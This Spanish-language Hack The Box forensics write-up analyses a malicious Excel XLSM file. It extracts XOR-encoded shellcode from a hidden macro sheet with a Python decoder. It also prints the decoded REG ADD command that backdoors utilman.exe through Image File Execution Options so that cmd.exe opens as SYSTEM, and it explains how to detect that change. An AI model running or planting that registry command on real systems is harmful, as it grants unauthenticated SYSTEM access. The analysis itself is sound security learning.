---
title: "Free Services"
description: "Writeup de Free Services - Hack The Box - Forensics 200pts. Archivo Excel XLSM con macro sheets ocultas; las celdas E1:G258 contienen shellcode XOR-encoded con clave 24; decodificar revela un comando REG ADD de backdoor en utilman.exe con la flag en el echo final."
sidebar:
  badge:
    text: Forensics
    variant: note
tags:
  - htb
  - forensics
  - excel
  - xlsm
  - macro
  - shellcode
  - xor
  - windows
  - registry
  - backdoor
  - utilman
---

# Free Services

> 🎯 Plataforma: Hack The Box
> 📂 Categoría: Forensics
> 🏆 Puntos: 200
> 👤 Autor: warrior866

---

## Descripción

Se proporciona un archivo `free_decryption.xlsm` (Excel con macros). Dentro del formato OOXML (que no es más que un ZIP), hay una **macro sheet oculta** (`xl/macrosheets/sheet1.xml`) que contiene valores numéricos en el rango de celdas E1:G258. Estos números son bytes de shellcode XOR-encoded con clave `24`. Al decodificarlos y volcarlos a un binario, `strings` revela un comando de registro de Windows que instala una backdoor en `utilman.exe` — y el echo del comando final contiene la flag.

---

## Análisis inicial

```bash
unzip -P 'hackthebox' a12c734e-87cd-4a3e-ae5f-13327b59b9d6.zip -d "free-services"
cd free-services

file free_decryption.xlsm
# free_decryption.xlsm: Microsoft Excel 2007+

# Descomprimir el XLSM como ZIP para inspeccionar su estructura interna
unzip free_decryption.xlsm -d excel_extraido
```

Al listar el contenido, aparece el directorio `xl/macrosheets/` que contiene `sheet1.xml` — una **macro sheet** oculta, ausente en el `xl/worksheets/` visible.

---

## Extracción y decodificación del shellcode

El script Python actúa como un extractor forense: abre el XLSM como ZIP, lee el XML de la macro sheet, filtra las celdas del rango E1:G258, las ordena por fila y columna, y aplica XOR con 24 a bytes alternos para desofuscar el shellcode:

```python
import zipfile
import xml.etree.ElementTree as ET

raw_data = []

with zipfile.ZipFile('free_decryption.xlsm', 'r') as z:
    for name in z.namelist():
        if 'macrosheets/sheet' in name:
            with z.open(name) as f:
                tree = ET.parse(f)
                root = tree.getroot()
                
                for elem in root.iter():
                    if '}' in elem.tag:
                        elem.tag = elem.tag.split('}', 1)[1]
                        
                cells = {}
                for c in root.iter('c'):
                    r_attr = c.get('r')
                    if r_attr:
                        col = ''.join(filter(str.isalpha, r_attr))
                        row = int(''.join(filter(str.isdigit, r_attr)))
                        
                        if col in ['E', 'F', 'G'] and 1 <= row <= 258:
                            v = c.find('v')
                            if v is not None and v.text is not None:
                                cells[(row, col)] = int(v.text)
                                
                for r in range(1, 259):
                    for c in ['E', 'F', 'G']:
                        if (r, c) in cells:
                            raw_data.append(cells[(r, c)])

if raw_data:
    print(f"[*] Extracted {len(raw_data)} numbers from E1:G258.")
    decoded = bytearray([d ^ 24 for d in raw_data[::2]])  # XOR key = 24
    with open('payload_clean.bin', 'wb') as out:
        out.write(decoded)
    print("[+] Saved clean shellcode to payload_clean.bin.")
```

```bash
python3 decoder.py
# [*] Extracted exactly 772 numbers from E1:G258.
# [+] Saved clean shellcode to payload_clean.bin.
```

---

## Extracción de strings del binario

```bash
strings payload_clean.bin
```

```text
;}$u
D$$[[aYZQ
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f;echo "HTB{FLAG}"
```

---

## ¿Qué es la backdoor de utilman.exe?

`utilman.exe` es la utilidad de accesibilidad de Windows (Magnifier, Narrator, etc.) que se puede lanzar desde la pantalla de inicio de sesión. Al registrar `cmd.exe` como "Debugger" de `utilman.exe` en la clave de registro `Image File Execution Options`, cualquier ejecución de `utilman.exe` (incluyendo pulsando Win+U en la pantalla de login) lanzará `cmd.exe` **con privilegios de SYSTEM** — sin necesidad de credenciales. Esta es una técnica clásica de persistencia y escalada de privilegios en Windows conocida como "Sticky Keys backdoor" o "accessibility backdoor".

---

## Cadena de Ataque

```text
1. Víctima abre free_decryption.xlsm en Excel
       ↓
2. Excel ejecuta la macro oculta automáticamente
       ↓
3. Macro lee celdas E1:G258 → bytes de shellcode XOR-encoded
       ↓
4. XOR decode con clave 24 → shellcode de registro Windows
       ↓
5. REG ADD instala backdoor: utilman.exe → cmd.exe con SYSTEM
       ↓
6. Atacante llega a la pantalla de login → Win+U → cmd.exe como SYSTEM
```

---

## Lecciones Aprendidas

- **Macro sheets ocultas**: a diferencia de las hojas normales de Excel (`worksheets`), las `macrosheets` son menos conocidas y pueden contener código XLM (Excel 4.0 Macros) que se ejecuta automáticamente. Muchos antivirus no las detectan bien.
- **OOXML como contenedor**: los archivos `.xlsx/.xlsm` son ZIPs que pueden inspeccionarse sin abrir Excel. Siempre descomprimir y revisar el XML internamente para análisis forense seguro.
- **XOR con clave constante**: una de las técnicas de ofuscación más simples. La clave (24 en este caso) puede encontrarse mediante análisis frecuencial o simplemente probando valores.
- **Image File Execution Options backdoor**: persistencia en Windows que sobrevive reinicios y permite acceso sin credenciales. Detectar con `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" /s`.

---

## Referencias

- [Sticky Keys backdoor](https://attack.mitre.org/techniques/T1546/008/)
- [Excel 4.0 Macro abuse](https://attack.mitre.org/techniques/T1137/002/)
- [HackTricks — Persistence Windows Registry](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autoruns)
